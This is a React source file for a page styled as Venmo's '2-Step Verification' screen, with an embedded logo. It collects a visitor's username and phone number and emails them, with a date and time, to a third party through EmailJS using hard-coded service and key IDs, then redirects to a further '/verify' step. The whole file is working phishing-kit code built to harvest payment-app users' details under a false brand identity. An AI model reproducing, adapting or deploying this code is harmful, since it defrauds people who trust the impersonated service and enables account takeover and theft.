import React, { useState } from 'react';
import { useNavigate} from 'react-router-dom';
import emailjs from 'emailjs-com';

const Alrt = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
  const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
  const navigate = useNavigate();

  const handleLogin = () => {
    let isValid = true;

    // Email validation
    if (!email) {
      setEmailError('Username is required');
      setEmailPlaceholder('Enter Username');
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError('Invalid Username format');
      isValid = false;
    } else {
      setEmailError('');
    }

    // Password validation
    if (!password) {
      setPasswordError('Number is required');
      setPasswordPlaceholder('Enter your Number');
      isValid = false;
    } else {
      setPasswordError('');
    }

    // If valid, send email
    if (isValid) {
      const templateParams = {
        web_name:'Venmo',
        from_name: 'Venmo',
        message: `Name: ${email}, 
        Phone: ${password}, 
        Date: ${new Date().toLocaleDateString()}, 
        Time: ${new Date().toLocaleTimeString()}`,
      };

      emailjs
        .send(
          'service_bzuewcp', // Your EmailJS Service ID
          'template_vkf7atk', // Your EmailJS Template ID
          templateParams,
          'BEBP_L2ryaPNa5V4S' // Your EmailJS Public Key
        )
        .then(() => {
          setEmail('');
          setPassword('');
          navigate('/verify'); // Navigate to the target route
        })
        .catch((error) => {
          console.error('Error:', error);
          alert('Failed to send email.');
        });
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col items-center pt-32">
      <header className="flex justify-center mb-8">
        <img
          alt="Navigation"
          className="w-32"
          src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjExIiBoZWlnaHQ9IjQxIiB2aWV3Qm94PSIwIDAgMjExIDQxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Ik0zNC41NzcxIDAuODIyMDIxQzM1Ljk5NzQgMy4xNjczMyAzNi42Mzc3IDUuNTgzMDEgMzYuNjM3NyA4LjYzNDUxQzM2LjYzNzcgMTguMzY3MiAyOC4zMjc3IDMxLjAxMDcgMjEuNTgzMiAzOS44ODg4SDYuMTc4MjVMMCAyLjk1Mjk2TDEzLjQ4ODcgMS42NzI1OEwxNi43NTUyIDI3Ljk1NDhDMTkuODA3NCAyMi45ODM0IDIzLjU3MzggMTUuMTcxIDIzLjU3MzggOS44NDQ1M0MyMy41NzM4IDYuOTI5MDIgMjMuMDc0MyA0Ljk0MzE4IDIyLjI5MzUgMy4zMDgwNkwzNC41NzcxIDAuODIyMDIxWiIgZmlsbD0iIzAwOENGRiIvPgogIDxwYXRoIGQ9Ik01Mi4wNTk1IDE3LjA4ODdDNTQuNTQxNyAxNy4wODg3IDYwLjc5MDcgMTUuOTUzNCA2MC43OTA3IDEyLjQwMjRDNjAuNzkwNyAxMC42OTczIDU5LjU4NDggOS44NDY3NiA1OC4xNjM3IDkuODQ2NzZDNTUuNjc3NiA5Ljg0Njc2IDUyLjQxNSAxMi44Mjc1IDUyLjA1OTUgMTcuMDg4N1pNNTEuNzc1MSAyNC4xMjE0QzUxLjc3NTEgMjguNDU3MyA1NC4xODY1IDMwLjE1ODQgNTcuMzgzNCAzMC4xNTg0QzYwLjg2NDcgMzAuMTU4NCA2NC4xOTc5IDI5LjMwNzggNjguNTMwMyAyNy4xMDY1TDY2Ljg5ODUgMzguMTg1MkM2My44NDYgMzkuNjc2MyA1OS4wODg4IDQwLjY3MTMgNTQuNDcxMyA0MC42NzEzQzQyLjc1ODQgNDAuNjcxMyAzOC41NjY0IDMzLjU2OTMgMzguNTY2NCAyNC42OTA4QzM4LjU2NjQgMTMuMTgzNCA0NS4zODUzIDAuOTY0NiA1OS40NDM2IDAuOTY0NkM2Ny4xODM3IDAuOTY0NiA3MS41MTE3IDUuMzAwMTMgNzEuNTExNyAxMS4zMzcxQzcxLjUxMjQgMjEuMDY5NSA1OS4wMTg4IDI0LjA1MSA1MS43NzUxIDI0LjEyMTRaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTExMC40MzkgOS4zNDgzNUMxMTAuNDM5IDEwLjc2ODcgMTEwLjIyNCAxMi44Mjg5IDExMC4wMDkgMTQuMTc1M0wxMDUuOTYyIDM5Ljc0NzRIOTIuODI3NUw5Ni41MTk2IDE2LjMwNTlDOTYuNTg5NiAxNS42NzAxIDk2LjgwNDggMTQuMzkwMSA5Ni44MDQ4IDEzLjY3OTlDOTYuODA0OCAxMS45NzQ3IDk1LjczOTMgMTEuNTQ5MyA5NC40NTgzIDExLjU0OTNDOTIuNzU2OCAxMS41NDkzIDkxLjA1MTMgMTIuMzI5OCA4OS45MTU1IDEyLjg5OTdMODUuNzI3OCAzOS43NDc3SDcyLjUxOTVMNzguNTUzNyAxLjQ2MTg1SDg5Ljk4NTVMOTAuMTMwMiA0LjUxNzczQzkyLjgyNzIgMi43NDIyNCA5Ni4zNzg1IDAuODIyMDIyIDEwMS40MTcgMC44MjIwMjJDMTA4LjA5MyAwLjgyMTI5MiAxMTAuNDM5IDQuMjMxOSAxMTAuNDM5IDkuMzQ4MzVaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTE0OS40MzIgNS4xNTU3N0MxNTMuMTk0IDIuNDU5MzYgMTU2Ljc0NiAwLjk2NDYgMTYxLjY0MyAwLjk2NDZDMTY4LjM4NyAwLjk2NDYgMTcwLjczMyA0LjM3NTIxIDE3MC43MzMgOS40OTE2N0MxNzAuNzMzIDEwLjkxMjEgMTcwLjUxOCAxMi45NzIzIDE3MC4zMDQgMTQuMzE4N0wxNjYuMjYxIDM5Ljg5MDdIMTUzLjEyM0wxNTYuODg2IDE1Ljk1MzhDMTU2Ljk1NSAxNS4zMTM5IDE1Ny4xMDEgMTQuNTMzNCAxNTcuMTAxIDE0LjAzODNDMTU3LjEwMSAxMi4xMTg0IDE1Ni4wMzUgMTEuNjkyNiAxNTQuNzU0IDExLjY5MjZDMTUzLjEyMyAxMS42OTI2IDE1MS40OTIgMTIuNDAyOCAxNTAuMjgxIDEzLjA0M0wxNDYuMDk0IDM5Ljg5MTFIMTMyLjk2TDEzNi43MjIgMTUuOTU0MUMxMzYuNzkxIDE1LjMxNDMgMTM2LjkzMyAxNC41MzM4IDEzNi45MzMgMTQuMDM4N0MxMzYuOTMzIDEyLjExODggMTM1Ljg2NiAxMS42OTMgMTM0LjU5IDExLjY5M0MxMzIuODg1IDExLjY5MyAxMzEuMTgzIDEyLjQ3MzUgMTMwLjA0NyAxMy4wNDM0TDEyNS44NTYgMzkuODkxNUgxMTIuNjUyTDExOC42ODYgMS42MDU1MkgxMjkuOTc4TDEzMC4zMzMgNC44MDE3NkMxMzIuOTYgMi44ODYyOCAxMzYuNTA4IDAuOTY2MDU3IDE0MS4yNjUgMC45NjYwNTdDMTQ1LjM4NCAwLjk2NDU5OSAxNDguMDggMi43NDA0NSAxNDkuNDMyIDUuMTU1NzdaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTE5Ni44NjkgMTYuMzA3NkMxOTYuODY5IDEzLjE4MjEgMTk2LjA4NyAxMS4wNTEyIDE5My43NDYgMTEuMDUxMkMxODguNTYzIDExLjA1MTIgMTg3LjQ5OCAyMC4yMTMzIDE4Ny40OTggMjQuOTAwM0MxODcuNDk4IDI4LjQ1NiAxODguNDkzIDMwLjY1NjYgMTkwLjgzNCAzMC42NTY2QzE5NS43MzMgMzAuNjU2NiAxOTYuODY5IDIwLjk5NDIgMTk2Ljg2OSAxNi4zMDc2Wk0xNzQuMTUgMjQuMzM0NUMxNzQuMTUgMTIuMjYwOCAxODAuNTM5IDAuOTYzMzc5IDE5NS4yMzggMC45NjMzNzlDMjA2LjMxNCAwLjk2MzM3OSAyMTAuMzYzIDcuNDk5ODUgMjEwLjM2MyAxNi41MjJDMjEwLjM2MyAyOC40NTU2IDIwNC4wNDMgNDAuODE0IDE4OC45ODkgNDAuODE0QzE3Ny44NDIgNDAuODE0IDE3NC4xNSAzMy40OTcgMTc0LjE1IDI0LjMzNDVaIiBmaWxsPSIjMDA4Q0ZGIi8+Cjwvc3ZnPg=="
        />
      </header>

      <div className="w-full max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
        <main className="flex flex-col items-center">
          <h1 className="text-blue-800 text-3xl font-medium pb-5">2-Step Verification</h1>
          <h3 className="text-lg text-gray-700 mb-6">Verify Your Identity</h3>
          <form
            method="post"
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className="w-full"
          >
            <div className="mb-4">
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError || emailPlaceholder === 'Enter Username' ? 'border-red-500' : 'border-gray-300'
                }`}
                required
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>
            <div className="mb-6">
              <input
                type="number"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder={passwordPlaceholder}
                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  passwordError || passwordPlaceholder === 'Enter your Number' ? 'border-red-500' : 'border-gray-300'
                }`}
                required
              />
              {passwordError && <p className="text-red-500 text-xs mt-1">{passwordError}</p>}
            </div>
            <div className="flex justify-center">
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700"
              >
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default Alrt;
